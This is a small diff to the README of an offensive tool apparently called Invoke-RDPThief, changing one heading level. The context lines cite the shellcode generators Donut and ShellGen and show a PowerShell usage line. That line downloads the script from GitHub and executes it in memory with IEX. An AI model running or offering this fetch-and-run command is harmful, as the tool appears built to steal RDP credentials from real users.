@@ -26,7 +26,7 @@ Donut: https://github.com/TheWover/donut
 
 Shellgen: https://github.com/Leo4j/ShellGen
 
-# Usage
+## Usage
 ```powershell
 # Load into memory and execute
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")
